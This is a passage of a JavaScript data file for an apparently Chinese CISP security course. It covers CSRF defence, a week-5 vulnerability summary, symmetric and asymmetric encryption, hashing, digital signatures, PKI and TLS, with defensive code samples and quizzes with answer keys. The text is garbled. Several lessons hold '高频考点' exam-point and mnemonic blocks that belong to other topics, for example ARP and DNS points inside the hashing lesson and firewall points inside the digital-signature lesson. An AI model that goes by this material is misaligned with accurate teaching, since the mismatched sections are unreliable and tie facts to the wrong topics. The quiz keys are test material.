JSON型：利用fetch发起跨域请求\n\n## \n## 🔴 高频考点\n\n· 数字签名完整流程：原文→哈希→**私钥加密**哈希→签名。验证：**公钥解密**签名→比对哈希\n· 数字签名同时保障**完整性(哈希比对)和不可否认性(私钥唯一)**\n· 数字证书=公钥+身份信息+CA签名——证书是对"公钥属于谁"的背书\n## 💜 记忆口诀\n\n· **签名流程**："原文→哈希(压指纹)→私钥加签(锁上)"、"验证：公钥解锁→对比哈希"\n· **两保障**："哈希对比=完整性(没被改)、私钥唯一=不可否认(就是你签的)"\n学习建议\n- 所有状态变更操作都应做CSRF防护\n- 优先使用框架自带的CSRF防护（如Django CSRF中间件）\n- 不要只依赖Referer验证`,
  codeExample:{language:'python',code:`from flask import Flask, session, request, render_template_string\nimport secrets\napp = Flask(__name__)\napp.secret_key = 'super-secret'\n@app.route('/transfer', methods=['POST'])\ndef transfer():\n    token = request.form.get('csrf_token')\n    if not token or token != session.get('csrf_token'):\n        return "CSRF检测！请求被拒绝", 403\n    session.pop('csrf_token')\n    return "转账成功"\n@app.route('/form')\ndef form():\n    token = secrets.token_hex(32)\n    session['csrf_token'] = token\n    return f'''<form method="POST" action="/transfer">\n    <input name="csrf_token" value="{token}" hidden>\n    金额: <input name="amount">\n    <button>转账</button></form>'''\nif __name__ == '__main__': app.run()`,description:'Flask CSRF Token防护示例'},
  quiz:[{id:'q34-1',question:'CSRF的全称？',options:['Cross-Site Request Forgery','Cross Site Resource File','Client Side Request Framework','Cross Server Response Filter'],correctIndex:0,explanation:'跨站请求伪造。'},{id:'q34-2',question:'CSRF防御最主要方式是？',options:['输入过滤','Token验证','加密传输','防火墙'],correctIndex:1,explanation:'CSRF Token是主要防御。'},{id:'q34-3',question:'SameSite Cookie设为Strict的效果？',options:['允许所有跨站','完全阻止跨站请求附带Cookie','仅允许GET','仅允许POST'],correctIndex:1,explanation:'Strict完全阻止跨站携带Cookie。'},{id:'q34-4',question:'CSRF与XSS的核心区别？',options:['CSRF需要注入脚本','CSRF利用已登录身份','CSRF比XSS危害大','CSRF只能GET'],correctIndex:1,explanation:'CSRF利用现有登录Session。'},{id:'q34-5',question:'CSRF Token应该存在哪里？',options:['URL','Cookie','Session+表单','LocalStorage'],correctIndex:2,explanation:'Token保存在Session，同时放入表单隐藏字段进行比对。'}],
  recommendedTools:weekToolMap[5]?.tools||[],labEnvironments:weekToolMap[5]?.labs||[],expertNotes:dayExpertNotes[34]||[],
});
allDays.push({id:'day-35',day:35,week:5,title:'第五周总结与测验（漏洞与攻击）',
  objectives:['回顾漏洞分类体系','总结SQL注入和XSS核心技术','掌握CSRF防御','测试综合理解'],
  content:`# 第五周总结与测验\n\n## 本周学习回顾\n\n本周系统学习了漏洞的定义、分类、评估标准和Web三大经典漏洞。\n\n### 知识点框架\n\n**Day 31 - 漏洞定义与分类**\n- 漏洞定义（ISO 27005）\n- CWE弱点枚举体系\n- CVE/CVSS评分标准\n- 漏洞生命周期管理\n\n**Day 32 - SQL注入深入**\n- 6种注入技术（Union/布尔盲注/时间盲注/报错/堆叠/二次）\n- 手工检测方法\n- SQLMap自动化工具\n- WAF绕过技巧\n- 参数化查询防御\n\n**Day 33 - XSS深入**\n- 反射型/存储型/DOM型XSS\n- 经典Payload和绕过技巧\n- XSS高级利用（Cookie窃取、BeEF框架）\n- CSP和输出编码防御\n\n**Day 34 - CSRF攻击**\n- 跨站请求伪造原理\n- CSRF Token防御机制\n- SameSite Cookie\n- CSRF与XSS区别\n\n## 综合测验\n\n请完成以下测验，巩固本周学习成果：\n\n## \n## 🔴 高频考点\n\n· PKI核心角色：**CA(证书颁发/信任锚)→RA(注册审核)→证书库→CRL(吊销)**\n· X.509证书标准七字段：版本/序列号/签名算法/颁发者/有效期/主体/公钥\n· CRL(证书吊销列表)vs OCSP(在线证书状态)——OCSP更实时更快\n## 💜 记忆口诀\n\n· **PKI四大角色**："CA证书工厂+RA身份审核+证书库公告+CRL吊销名单"\n· **X.509七字段**："版-号-签-发-期-主-钥"\n学习建议\n- 用思维导图梳理本周知识框架\n- 在靶场亲手练习各类注入技术\n- 对比SQL注入/XSS/CSRF的防御异同`,
  codeExample:{language:'python',code:`# 第五周综合练习题\nprint("=== 第五周漏洞与攻击综合测试 ===")\nscore=0\nq1=input("1.SQL注入的根本防御是?(A)WAF (B)参数化查询 (C)编码 (D)加密:")\nif q1.upper()=="B": score+=20; print("正确!")\nelse: print("错误!答案是参数化查询")\nq2=input("2.CVSS 9.0分属于?(A)低危 (B)中危 (C)高危 (D)严重:")\nif q2.upper()=="D": score+=20\nq3=input("3.XSS三种类型不包括?(A)反射型 (B)存储型 (C)DOM型 (D)文件型:")\nif q3.upper()=="D": score+=20\nq4=input("4.CSRF防御主要靠?(A)输入过滤 (B)Token验证 (C)HTTPS (D)防火墙:")\nif q4.upper()=="B": score+=20\nq5=input("5.SameSite=Strict的作用?(A)允许跨站 (B)阻止跨站Cookie (C)加密 (D)加速:")\nif q5.upper()=="B": score+=20\nprint(f"总分: {score}/100")`,description:'第五周综合测验'},
  quiz:[{id:'q35-1',question:'CVSS评分中7.0-8.9属于哪个等级？',options:['低危','中危','高危','严重'],correctIndex:2,explanation:'7.0-8.9=高危。'},{id:'q35-2',question:'SQL注入中基于响应延迟的技术叫什么？',options:['联合查询','时间盲注','布尔盲注','报错注入'],correctIndex:1,explanation:'通过SLEEP函数判断。'},{id:'q35-3',question:'XSS中危害最大的是什么类型？',options:['反射型','存储型','DOM型','Self-XSS'],correctIndex:1,explanation:'存储型影响所有用户。'},{id:'q35-4',question:'CSRF Token验证属于什么防御方式？',options:['输入验证','Session验证','请求验证','输出编码'],correctIndex:2,explanation:'验证请求合法性。'},{id:'q35-5',question:'以下哪个不是Web安全漏洞？',options:['SQL注入','XSS','CSRF','ARP欺骗'],correctIndex:3,explanation:'ARP欺骗是网络层攻击。'}],
  recommendedTools:weekToolMap[5]?.tools||[],labEnvironments:weekToolMap[5]?.labs||[],expertNotes:dayExpertNotes[35]||[],
});

// ============================================================
// Week 6: 加密技术 (Day 36-42)
// ============================================================
allDays.push({id:'day-36',day:36,week:6,title:'对称加密算法（加密技术）',
  objectives:['理解对称加密原理','掌握AES/DES算法特点','区分分组密码和流密码','了解加密模式'],
  content:`# 对称加密算法\n\n## 概述\n\n对称加密使用相同的密钥进行加密和解密。发送方用密钥加密明文，接收方用同一密钥解密密文。对称加密速度快，适合大量数据的加密。\n\n## 核心内容\n\n### 一、对称加密模型\n\n明文 + 密钥 → 加密算法 → 密文 → 解密算法 + 密钥 → 明文\n\n### 二、分组密码 vs 流密码\n\n**分组密码**：将明文分成固定大小的块分别加密\n- DES：64位分组，56位密钥（已不安全）\n- 3DES：三次DES加密，有效密钥112/168位\n- AES：128位分组，128/192/256位密钥（当前标准）\n- SM4：国产分组密码，128位分组和密钥\n\n**流密码**：对数据流逐位加密\n- RC4：简单快速但已不安全\n- ChaCha20：现代流密码，性能优异\n\n### 三、AES详解\n\nAES（高级加密标准）取代DES成为当前最广泛使用的对称加密算法。\n\n**AES参数：**\n- 分组长度：128位（16字节）\n- 密钥长度：128/192/256位\n- 轮数：10/12/14轮（对应密钥长度）\n\n**AES加密过程：**\n1. 密钥扩展（Key Expansion）\n2. 初始轮密钥加（AddRoundKey）\n3. 9/11/13轮：字节替换→行移位→列混合→轮密钥加\n4. 最后一轮：字节替换→行移位→轮密钥加\n\n### 四、加密模式\n\n- **ECB**：电子密码本，相同明文产生相同密文（不安全）\n- **CBC**：密码分组链接，需要IV初始化向量\n- **CTR**：计数器模式，支持并行加密\n- **GCM**：带认证的加密，同时提供机密性和完整性\n\n### 五、密钥管理\n\n- 密钥长度直接影响安全性\n- 密钥应随机生成并安全存储\n- 定期更换密钥（密钥轮换）\n- 使用KMS（密钥管理系统）管理\n\n## \n## 🔴 高频考点\n\n· TLS 1.3握手简化为**1-RTT**(相比TLS 1.2的2-RTT更快)\n· TLS握手核心：客户端随机数+服务端随机数+预主密钥→三者混合计算会话密钥\n· HTTPS=HTTP over TLS——证书验证三步：链完整、有效期对、域名匹配\n## 💜 记忆口诀\n\n· **TLS握手**："客户端Hello(说密码套件)→服务端选套件+发证书→双方换随机数→算出会话密钥"\n· **TLS 1.3**："1-RTT快一倍、扔掉不安全算法"\n学习建议\n- 使用OpenSSL实践AES加密\n- 理解不同加密模式的差异\n- 了解对称加密在实际系统中的应用`,
  codeExample:{language:'python',code:`from Crypto.Cipher import AES\nfrom Crypto.Random import get_random_bytes\nimport base64\n\ndef aes_encrypt(key, plaintext):\n    cipher = AES.new(key, AES.MODE_GCM)\n    ciphertext, tag = cipher.encrypt_and_digest(plaintext.encode())\n    return base64.b64encode(cipher.nonce + tag + ciphertext).decode()\n\ndef aes_decrypt(key, encrypted):\n    raw = base64.b64decode(encrypted)\n    nonce, tag, ciphertext = raw[:16], raw[16:32], raw[32:]\n    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)\n    return cipher.decrypt_and_verify(ciphertext, tag).decode()\n\nkey = get_random_bytes(32)  # 256位密钥\nmsg = "Hello, CISP!"\nenc = aes_encrypt(key, msg)\ndec = aes_decrypt(key, enc)\nprint(f"原文: {msg}")\nprint(f"密文: {enc}")\nprint(f"解密: {dec}")`,description:'AES-256-GCM加密解密示例'},
  quiz:[{id:'q36-1',question:'AES的分组长度是多少？',options:['64位','128位','256位','512位'],correctIndex:1,explanation:'AES分组固定128位。'},{id:'q36-2',question:'AES-256的密钥长度？',options:['128位','192位','256位','512位'],correctIndex:2,explanation:'AES-256密钥256位。'},{id:'q36-3',question:'ECB模式的主要问题？',options:['速度慢','相同明文产生相同密文','不支持解密','需要IV'],correctIndex:1,explanation:'ECB不隐藏数据模式。'},{id:'q36-4',question:'同时提供加密和认证的模式？',options:['ECB','CBC','CTR','GCM'],correctIndex:3,explanation:'GCM=Galois/Counter Mode。'},{id:'q36-5',question:'中国国家密码管理局批准的对称密码算法是什么？',options:['AES','3DES','SM4','RC4'],correctIndex:2,explanation:'SM4是国产分组密码算法。'}],
  recommendedTools:weekToolMap[6]?.tools||[],labEnvironments:weekToolMap[6]?.labs||[],expertNotes:dayExpertNotes[36]||[],
});
allDays.push({id:'day-37',day:37,week:6,title:'非对称加密算法（加密技术）',
  objectives:['理解非对称加密（公钥密码）原理','掌握RSA算法核心','了解ECC/椭圆曲线','对比对称与非对称加密'],
  content:`# 非对称加密算法\n\n## 概述\n\n非对称加密使用一对密钥：公钥用于加密，私钥用于解密。公钥可以公开分发，私钥必须保密。非对称加密解决了密钥分发问题，但速度远慢于对称加密。\n\n## 核心内容\n\n### 一、RSA算法\n\nRSA是最广泛使用的非对称加密算法，基于大整数分解难题。\n\n**密钥生成：**\n1. 选择两个大质数p和q\n2. 计算n = p × q\n3. 计算φ(n) = (p-1)(q-1)\n4. 选择e（通常为65537），满足gcd(e, φ(n)) = 1\n5. 计算d ≡ e⁻¹ (mod φ(n))\n6. 公钥：(n, e)，私钥：(n, d)\n\n**安全性依赖：**大整数n的因数分解困难\n\n**推荐密钥长度：**至少2048位（2024+）\n\n### 二、ECC椭圆曲线密码\n\n基于椭圆曲线离散对数问题，相比RSA在同等安全性下密钥更短：\n\n| 安全等级 | RSA | ECC |\n|---------|-----|-----|\n| 128位等效 | 3072位 | 256位 |\n| 256位等效 | 15360位 | 512位 |\n\n### 三、对称 vs 非对称\n\n| 特性 | 对称加密 | 非对称加密 |\n|------|---------|-----------|\n| 密钥数量 | 1个 | 2个 |\n| 速度 | 快（~1000倍） | 慢 |\n| 密钥分发 | 需要安全信道 | 公钥可公开 |\n| 典型用途 | 数据加密 | 密钥交换/签名 |\n\n### 四、实际应用\n\n- **TLS握手**：用非对称交换对称密钥\n- **数字签名**：用私钥签名，公钥验证\n- **SSL证书**：CA用私钥签名证书\n\n## 学习建议\n- 理解RSA数学原理\n- 实践openssl生成RSA密钥对\n- 了解后量子密码发展趋势`,
  codeExample:{language:'python',code:`from Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_OAEP\n\n# 生成RSA密钥对\nkey = RSA.generate(2048)\nprivate_key = key.export_key()\npublic_key = key.publickey().export_key()\n\n# 加密\npub = RSA.import_key(public_key)\ncipher = PKCS1_OAEP.new(pub)\nct = cipher.encrypt(b"Hello CISP Exam!")\nprint(f"密文长度: {len(ct)}字节")\n\n# 解密\npriv = RSA.import_key(private_key)\ncipher2 = PKCS1_OAEP.new(priv)\npt = cipher2.decrypt(ct)\nprint(f"解密: {pt.decode()}")`,description:'RSA-2048加密解密示例'},
  quiz:[{id:'q37-1',question:'RSA算法安全性基于什么数学难题？',options:['离散对数','大整数分解','背包问题','椭圆曲线'],correctIndex:1,explanation:'RSA依赖大整数分解困难。'},{id:'q37-2',question:'RSA的推荐密钥长度(2024)？',options:['1024位','2048位','4096位','8192位'],correctIndex:1,explanation:'至少2048位。'},{id:'q37-3',question:'ECC相比RSA的优势？',options:['更安全','密钥更短且同等安全','加密更快','实现更简单'],correctIndex:1,explanation:'ECC密钥短但安全等效。'},{id:'q37-4',question:'实际应用中非对称加密主要用于？',options:['大量数据加密','密钥交换和签名','文件压缩','数据库加密'],correctIndex:1,explanation:'非对称加密慢，常用于密钥交换。'},{id:'q37-5',question:'公钥可以公开，私钥必须？',options:['也公开','保密','可共享','无所谓'],correctIndex:1,explanation:'私钥保密是安全基础。'}],
  recommendedTools:weekToolMap[6]?.tools||[],labEnvironments:weekToolMap[6]?.labs||[],expertNotes:dayExpertNotes[37]||[],
});
allDays.push({id:'day-38',day:38,week:6,title:'哈希函数（加密技术）',
  objectives:['理解哈希函数的特性和用途','掌握MD5/SHA系列算法','了解哈希碰撞和彩虹表','学习HMAC消息认证码'],
  content:`# 哈希函数\n\n## 概述\n\n哈希（Hash）函数将任意长度的输入映射为固定长度的输出（摘要/指纹）。哈希函数是单向的——从哈希值无法还原原始数据。\n\n## 核心内容\n\n### 一、哈希函数特性\n\n1. **确定性**：相同输入总产生相同输出\n2. **快速计算**：对任意长度输入快速生成摘要\n3. **抗原像性**：给定h(x)，无法找到x\n4. **抗第二原像性**：给定x，无法找到x'≠x使得h(x)=h(x')\n5. **抗碰撞性**：无法找到任意x≠x'使得h(x)=h(x')\n\n### 二、常见哈希算法\n\n| 算法 | 输出长度 | 安全性 |\n|------|---------|--------|\n| MD5 | 128位 | ❌ 已破解（碰撞攻击）|\n| SHA-1 | 160位 | ❌ 已破解 |\n| SHA-256 | 256位 | ✅ 安全 |\n| SHA-512 | 512位 | ✅ 安全 |\n| SM3 | 256位 | ✅ 国密标准 |\n\n### 三、典型的应用\n\n1. **密码存储**：存储hash(password + salt)\n2. **文件完整性**：下载文件后验证哈希\n3. **数字签名**：对消息摘要签名\n4. **区块链**：PoW工作量证明、Merkle树\n5. **重复数据检测**：对比哈希值判断文件相同\n\n### 四、彩虹表攻击\n\n彩虹表预计算了大量密码→哈希值的映射，可快速反向查找。\n\n**防御方法：加盐（Salt）**\n- 每个用户使用不同的随机Salt\n- 存储：hash(password + salt)\n- 即使相同密码，不同salt产生不同哈希\n\n### 五、HMAC\n\nHMAC（Hash-based Message Authentication Code）使用密钥+哈希确保消息完整性和认证：\n- HMAC-SHA256\n- HMAC-SM3（国密）\n\n## \n## 🔴 高频考点\n\n· ARP欺骗→中间人窃听(局域网最常用攻击)，防御：静态ARP/DAI动态ARP检测\n· DNS三大防线：**DNSSEC(DNS签名防篡改)+DoH/DoT(加密查询防窃听)+DNS过滤(阻断恶意域名)**\n· ICMP隧道是隐蔽通信典型手段——不正常的ICMP包大小和频率需关注\n## 💜 记忆口诀\n\n· **ARP欺骗**："谁有网关MAC→我！→流量全到我→中间人"\n· **DNS三角**："DNSSEC防篡、DoH/DoT防窃、DNS过滤防毒"\n学习建议\n- 不要再用MD5/SHA-1存储密码\n- 使用bcrypt/scrypt/argon2存储密码\n- 理解加盐原理`,
  codeExample:{language:'python',code:`import hashlib\nimport hmac\n\n# SHA-256示例\ndata = "Hello CISP"\nh = hashlib.sha256(data.encode()).hexdigest()\nprint(f"SHA-256: {h}")\n\n# 文件哈希\nwith open("example.txt","rb") as f:\n    file_hash = hashlib.sha256(f.read()).hexdigest()\nprint(f"File Hash: {file_hash}")\n\n# HMAC消息认证\nkey = b"secret-key-12345"\nmsg = b"important message"\nsig = hmac.new(key, msg, hashlib.sha256).hexdigest()\nprint(f"HMAC-SHA256: {sig}")\n\n# 验证HMAC\nv = hmac.compare_digest(\n    sig, hmac.new(key, msg, hashlib.sha256).hexdigest())\nprint(f"验证通过: {v}")`,description:'SHA-256和HMAC使用示例'},
  quiz:[{id:'q38-1',question:'哈希函数的核心特性不包括？',options:['抗原像性','抗碰撞性','可逆性','确定性'],correctIndex:2,explanation:'哈希是单向的不可逆。'},{id:'q38-2',question:'MD5的输出长度？',options:['64位','128位','256位','512位'],correctIndex:1,explanation:'MD5输出128位。'},{id:'q38-3',question:'防御彩虹表攻击的主要手段？',options:['使用更长密码','使用SHA-512','加盐','使用MD5'],correctIndex:2,explanation:'加盐使预计算无效。'},{id:'q38-4',question:'HMAC提供什么功能？',options:['加密数据','消息认证和完整性','数字签名','密钥交换'],correctIndex:1,explanation:'HMAC通过密钥验证消息。'},{id:'q38-5',question:'中国国家标准的哈希算法？',options:['SHA-256','MD5','SM3','RIPEMD'],correctIndex:2,explanation:'SM3是中国国家密码管理局发布的哈希算法。'}],
  recommendedTools:weekToolMap[6]?.tools||[],labEnvironments:weekToolMap[6]?.labs||[],expertNotes:dayExpertNotes[38]||[],
});
allDays.push({id:'day-39',day:39,week:6,title:'数字签名（加密技术）',
  objectives:['理解数字签名原理','掌握签名和验证流程','了解PKI证书体系','学习国密SM2签名'],
  content:`# 数字签名\n\n## 概述\n\n数字签名是非对称加密的典型应用。发送方用自己的私钥对消息摘要签名，接收方用发送方的公钥验证签名，确保消息的完整性和非否认性。\n\n## 核心内容\n\n### 一、数字签名特性\n\n1. **完整性**：消息未篡改\n2. **认证性**：确认发送者身份\n3. **非否认性**：发送者无法否认\n\n### 二、签名流程\n\n**签名过程：**\n1. 对消息计算哈希（SHA-256）\n2. 用发送方私钥加密哈希值 → 数字签名\n3. 将签名附在消息后发送\n\n**验证过程：**\n1. 对收到的消息计算哈希\n2. 用发送方公钥解密签名得到原始哈希\n3. 比对两个哈希：一致则验证通过\n\n### 三、常见签名算法\n\n- RSA签名（PKCS#1）\n- DSA（数字签名算法）\n- ECDSA（椭圆曲线数字签名）\n- SM2签名（国密标准，基于椭圆曲线）\n\n### 四、PKI公钥基础设施\n\nPKI通过证书认证机构（CA）解决公钥信任问题：\n\n**PKI组件：**\n- CA（Certificate Authority）证书认证机构\n- RA（Registration Authority）注册机构\n- 证书库（存储和分发证书）\n- 密钥管理中心\n\n**X.509证书内容：**\n- 版本号、序列号\n- 签名算法标识\n- 颁发者（Issuer）\n- 有效期（Not Before / Not After）\n- 主体（Subject）\n- 主体公钥信息\n- CA的数字签名\n\n### 五、SM2签名算法\n\nSM2基于ECC椭圆曲线，是中国商用密码标准：\n- 密钥长度：256位\n- 签名结果：64字节（r+s各32字节）\n- GmSSL和OpenSSL 1.1.1+支持\n\n## \n## 🔴 高频考点\n\n· 防火墙三代演进：**包过滤(网络层)→状态检测(传输层/跟踪连接)→NGFW(应用层/识别协议)**\n· DMZ区域放置对外服务(Web/邮件/DNS服务器)——保护内网不被直接访问\n· "默认拒绝"是所有防火墙的基础安全原则——不在白名单的全部阻断\n## 💜 记忆口诀\n\n· **防火墙演变**："初代看IP端口→二代记连接→三代认应用(NGFW)"\n· **规则铁律**："默认拒绝——只开放明确需要的——最后一条是Deny All"\n学习建议\n- 理解签名≠加密（签名用私钥，加密用公钥）\n- 了解X.509证书结构\n- 实践中用openssl做签名验证`,
  codeExample:{language:'python',code:`from Crypto.Signature import pkcs1_15\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\n\n# 生成密钥\nkey = RSA.generate(2048)\n\n# 签名\nmsg = b"Important contract content"\nh = SHA256.new(msg)\nsignature = pkcs1_15.new(key).sign(h)\nprint(f"签名长度: {len(signature)}字节")\n\n# 验证\ntry:\n    pkcs1_15.new(key.publickey()).verify(SHA256.new(msg), signature)\n    print("签名验证通过!")\nexcept (ValueError, TypeError):\n    print("签名无效!")`,description:'RSA签名和验证示例'},
  quiz:[{id:'q39-1',question:'数字签名使用什么密钥签名？',options:['公钥','私钥','对称密钥','证书'],correctIndex:1,explanation:'签名用私钥，验证用公钥。'},{id:'q39-2',question:'PKI中CA的作用？',options:['加密数据','颁发和管理证书','存储密码','扫描漏洞'],correctIndex:1,explanation:'CA是证书认证机构。'},{id:'q39-3',question:'X.509证书中不包含？',options:['颁发者','有效期','用户密码','公钥'],correctIndex:2,explanation:'证书不包含用户密码。'},{id:'q39-4',question:'ECDSA的"EC"代表什么？',options:['Electronic Code','Elliptic Curve','Encrypted Channel','Error Correction'],correctIndex:1,explanation:'椭圆曲线数字签名。'},{id:'q39-5',question:'SM2签名算法基于什么曲线？',options:['RSA-2048','secp256k1','SM2 P-256','NIST P-384'],correctIndex:2,explanation:'SM2基于国产椭圆曲线。'}],
  recommendedTools:weekToolMap[6]?.tools||[],labEnvironments:weekToolMap[6]?.labs||[],expertNotes:dayExpertNotes[39]||[],
});
allDays.push({id:'day-40',day:40,week:6,title:'PKI体系（加密技术）',
  objectives:['理解PKI架构和组件','掌握证书链验证机制','了解CRL和OCSP','学习证书申请流程'],
  content:`# PKI公钥基础设施体系\n\n## 概述\n\nPKI（Public Key Infrastructure）是一套管理公钥加密和数字证书的系统。它解决了在开放网络中验证通信方身份的问题，是TLS/SSL、代码签名、VPN等安全应用的基础。\n\n## 核心内容\n\n### 一、PKI架构\n\n**核心组件：**\n- **CA（证书认证机构）**：签发、撤销、更新证书\n- **RA（注册机构）**：验证申请者身份\n- **证书库/CRL**：分发证书和吊销列表\n- **终端实体**：持有证书的用户/服务器\n\n### 二、证书链（信任链）\n\n根CA → 中间CA → 终端证书：\n1. 根CA自签名证书（Root CA）— 预装于浏览器/操作系统\n2. 根CA签发中间CA证书\n3. 中间CA签发终端证书（如网站SSL证书）\n\n验证时逐级向上检查直到可信的根证书\n\n### 三、证书吊销\n\n**CRL（证书吊销列表）**：\n- CA定期发布被吊销证书的序列号列表\n- 客户端下载CRL检查证书是否有效\n\n**OCSP（在线证书状态协议）**：\n- 实时查询某证书是否被吊销\n- 比CRL更及时但增加延迟\n- OCSP Stapling：服务器代客户端查询并缓存结果\n\n### 四、证书申请流程\n\n1. 生成密钥对（私钥+CSR）\n2. 提交CSR（证书签名请求）给CA\n3. CA验证身份（DV/OV/EV）\n4. CA签发证书\n5. 安装证书到服务器\n\n### 五、证书类型\n\n- **DV（域名验证）**：仅验证域名所有权，免费\n- **OV（组织验证）**：验证企业和域名\n- **EV（扩展验证）**：最严格验证，显示绿色公司名\n\n## \n## 🔴 高频考点\n\n· **IDS(旁路/仅告警不阻断)vs IPS(串联/可阻断)**——最高频IDS/IPS区别考点\n· 特征匹配(精确但只能查已知)vs异常检测(能查未知但误报多)——检测方法优缺点\n· Snort开源IDS三大模式：嗅探/包日志/网络入侵检测\n## 💜 记忆口诀\n\n· **IDS/IPS**："IDS旁路=看+喊(偷东西了!)、IPS串联=看+堵(休想过去!)"\n· **检测双刃剑**："特征匹配=精确但只查已知、异常检测=能查新型但误报多"\n学习建议\n- 用openssl创建自签名CA和证书\n- 理解证书链验证过程\n- 了解Let's Encrypt免费证书`,
  codeExample:{language:'bash',code:`# 创建自签名CA\nopenssl genrsa -out ca.key 2048\nopenssl req -x509 -new -key ca.key -days 3650 -out ca.crt\n\n# 生成服务器证书\nopenssl genrsa -out server.key 2048\nopenssl req -new -key server.key -out server.csr\nopenssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt -days 365\n\n# 查看证书内容\nopenssl x509 -in server.crt -text -noout`,description:'OpenSSL创建证书链示例'},
  quiz:[{id:'q40-1',question:'PKI中签发证书的机构叫什么？',options:['RA','CA','CRL','OCSP'],correctIndex:1,explanation:'CA=证书认证机构。'},{id:'q40-2',question:'OCSP的作用？',options:['签发证书','实时查询证书状态','加密通信','存储密钥'],correctIndex:1,explanation:'在线证书状态协议。'},{id:'q40-3',question:'EV证书的"EV"代表？',options:['Extended Validation','Enhanced Verification','Extra Value','Encrypted Verification'],correctIndex:0,explanation:'扩展验证证书。'},{id:'q40-4',question:'CRL的全称？',options:['Certificate Request List','Certificate Revocation List','Certified Resource Locator','Central Registry List'],correctIndex:1,explanation:'证书吊销列表。'},{id:'q40-5',question:'签发SSL证书最低验证级别？',options:['EV','OV','DV','WV'],correctIndex:2,explanation:'DV=域名验证。'}],
  recommendedTools:weekToolMap[6]?.tools||[],labEnvironments:weekToolMap[6]?.labs||[],expertNotes:dayExpertNotes[40]||[],
});
allDays.push({id:'day-41',day:41,week:6,title:'TLS/SSL协议（加密技术）',
  objectives:['理解TLS握手过程','了解TLS 1.3新特性','掌握证书验证原理','理解前向安全性'],
  content:`# TLS/SSL协议\n\n## 概述\n\nTLS（传输层安全）协议的前身是SSL，是互联网安全通信的基石。TLS为网络通信提供机密性、完整性和身份认证，广泛用于HTTPS、邮件、即时通讯等场景。\n\n## 核心内容\n\n### 一、TLS架构\n\nTLS工作在传输层和应用层之间，分为两层：\n- **握手协议层**：身份认证、密钥协商\n- **记录协议层**：数据加密传输\n\n### 二、TLS 1.3握手过程\n\n相比TLS 1.2减少了往返次数（1-RTT甚至0-RTT）：\n\n1. Client Hello：支持的加密套件、密钥共享（DHE/ECDHE）\n2. Server Hello：选择加密套件、服务器密钥共享、证书\n3. 双方各自计算预主密钥 → 会话密钥\n4. 完成握手，开始加密通信\n\n**TLS 1.3改进：**\n- 移除不安全算法（RSA密钥交换、CBC模式、RC4）\n- 仅支持前向安全（PFS）算法\n- 握手消息加密\n- 减少延迟\n\n### 三、加密套件\n\n格式：TLS_密钥交换_签名_加密_MAC\n\n示例：TLS_ECDHE_RSA_AES256_GCM_SHA384\n- ECDHE：椭圆曲线密钥交换\n- RSA：签名算法\n- AES256_GCM：加密算法\n- SHA384：哈希/MAC\n\n### 四、前向安全性\n\n前向安全保证：即使服务器私钥泄露，过去会话的通信内容无法解密。\n\n**实现方式：**临时密钥交换（DHE/ECDHE），每个会话使用新的临时密钥，用完丢弃。\n\n### 五、证书验证\n\n浏览器验证服务器证书的过程：\n1. 检查证书是否在有效期内\n2. 验证域名是否匹配（CN或SAN）\n3. 验证证书链（逐级验证签名）\n4. 检查证书是否被吊销（CRL/OCSP）\n\n## \n## 🔴 高频考点\n\n· IPSec VPN两大协议：**AH(认证头/仅完整性无加密)vs ESP(封装安全/加密+认证)**\n· IPSec vs SSL VPN：IPSec=站点到站点/网络层/需客户端，SSL=远程访问/TLS/浏览器即可\n· WireGuard是最新最快VPN协议——代码精简、性能卓越\n## 💜 记忆口诀\n\n· **AH vs ESP**："AH验身不加密(认证头)、ESP加密又验身(实荐)"\n· **VPN选型**："站点到站点→IPSec、远程办公→SSL VPN、新部署→WireGuard极速"\n学习建议\n- 用Wireshark抓包观察TLS握手\n- 了解TLS 1.3的加密套件\n- 理解中间人攻击原理`,
  codeExample:{language:'python',code:`import ssl, socket\n# 创建TLS连接\nctx = ssl.create_default_context()\n# 设置最低TLS版本\nctx.minimum_version = ssl.TLSVersion.TLSv1_2\nwith socket.create_connection(('www.baidu.com', 443)) as sock:\n    with ctx.wrap_socket(sock, server_hostname='www.baidu.com') as ssock:\n        print(f"TLS版本: {ssock.version()}")\n        print(f"加密套件: {ssock.cipher()}")\n        cert = ssock.getpeercert()\n        print(f"证书主题: {cert['subject']}")\n        print(f"有效期至: {cert['notAfter']}")`,description:'Python TLS连接示例'},
  quiz:[{id:'q41-1',question:'TLS 1.3握手需要多少RTT？',options:['0-RTT','1-RTT','2-RTT','3-RTT'],correctIndex:1,explanation:'TLS 1.3只需1-RTT完成握手。'},{id:'q41-2',question:'ECDHE提供什么特性？',options:['更快加密','前向安全','更强签名','更大密钥'],correctIndex:1,explanation:'临时密钥保证前向安全。'},{id:'q41-3',question:'TLS 1.3移除的不安全算法不包括？',options:['RSA密钥交换','RC4','AES-GCM','CBC模式'],correctIndex:2,explanation:'AES-GCM是安全的并被保留。'},{id:'q41-4',question:'前向安全的英文？',options:['Forward Safety','Perfect Forward Secrecy','Pre-Forward Security','Front Secure'],correctIndex:1,explanation:'PFS=Perfect Forward Secrecy。'},{id:'q41-5',question:'TLS中证书验证不包括？',options:['有效期检查','域名匹配','证书链验证','密码强度'],correctIndex:3,explanation:'密码强度不属于证书验证范围。'}],
  recommendedTools:weekToolMap[6]?.tools||[],labEnvironments:weekToolMap[6]?.labs||[],expertNotes:dayExpertNotes[41]||[],
});
allDays.push({id:'day-42',day:42,week:6,title:'第六周总结与测验（加密技术）',
  objectives:['回顾对称与非对称加密','总结哈希和签名技术','掌握PKI和TLS体系','综合测试'],
  content:`# 第六周总结与测验\n\n## 本周知识回顾\n\n### Day 36 - 对称加密\n- AES/DES/SM4算法\n- 加密模式ECB/CBC/CTR/GCM\n- 密钥管理\n\n### Day 37 - 非对称加密\n- RSA原理（大整数分解）\n- ECC优势（短密钥高安全）\n- 加密与签名的密钥使用区别\n\n### Day 38 - 哈希函数\n- SHA-256/SM3\n- 加盐防彩虹表\n- HMAC消息认证\n\n### Day 39 - 数字签名\n- 签名=私钥加密哈希\n- PKI基本概念\n- X.509证书结构\n\n### Day 40 - PKI体系\n- CA/RA/证书库\n- 证书链验证\n- CRL和OCSP\n\n### Day 41 - TLS/SSL\n- TLS 1.3握手过程\n- 前向安全(PFS)\n- 证书验证流程\n\n## 综合测验`,
